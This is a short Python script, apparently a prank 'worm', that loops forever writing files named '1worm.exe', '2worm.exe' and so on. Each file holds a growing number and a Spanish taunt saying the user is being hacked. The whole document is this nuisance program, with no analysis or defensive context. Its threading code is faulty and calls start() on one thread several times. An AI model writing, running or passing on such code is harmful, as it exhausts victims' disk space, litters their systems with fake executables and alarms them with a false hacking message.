from threading import Thread

FilesMax = 1
data = 99
FileName = str(FilesMax) + "worm.exe"
pila = []

def worm(data=data, FileName=FileName, FilesMax=FilesMax):

        while True:

          file = open(str(FileName), "wb")
          datafinal = str(data) + "tu estas \0x79\0x50\0x89\0x84\0x88\sien\0x79\do \0x79\ha\0x79\ck\0x79\ead\0x79\o jeje\0x79\jejej\0x79\0x50\0x89\0x84\0x80\0x88\0x85\0x84"
          file.write(str(datafinal).encode())

          file.close()

          data = int(data) * 8
          FilesMax = FilesMax + 1 
          FileName = str(FilesMax) + "worm.exe"


try:
        hilo = Thread(target=worm)
        for i in range(1, 5):
                hilo.setDaemon(True)
                hilo.start()
                pila.append(hilo)
except:
        worm()





